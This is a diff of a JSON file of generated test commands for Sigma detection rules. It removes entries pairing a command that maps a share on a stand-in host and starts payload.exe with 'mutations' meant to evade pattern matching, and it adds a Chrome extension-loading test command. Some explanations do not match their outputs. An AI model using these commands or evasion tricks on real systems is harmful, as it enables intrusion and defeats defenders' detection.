@@ -1,18 +1,6 @@
 [
   {
-    "output": "cmd.exe /c \" net use https://192.0.2.1/share & start payload.exe \"",
-    "explanation": "This is the original true positive command and is not a bypass. It is included for reference."
-  },
-  {
-    "output": "cmd.exe /c \"net use https://192.0.2.1/share ^& start payload.exe\"",
-    "explanation": "Escape the ampersand with a caret (^) to avoid direct pattern matching on '&'. This is a safe mutation technique."
-  },
-  {
-    "output": "cmd.exe /c \" net use https://192.0.2.1/share & start payload.exe\"",
-    "explanation": "Remove the space before the ampersand to slightly alter the pattern while maintaining functionality."
-  },
-  {
-    "output": "cmd.exe /c \"net use https://192.0.2.1/share & start payload.exe\"",
-    "explanation": "Remove unnecessary spaces around the command to alter the string pattern while preserving behavior."
+    "output": "cmd.exe /c \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --load-extension=C:\\Temp\\test_ext",
+    "explanation": "The original command is already a valid test command. No mutation is needed to simulate a true positive for this Sigma rule."
   }
 ]
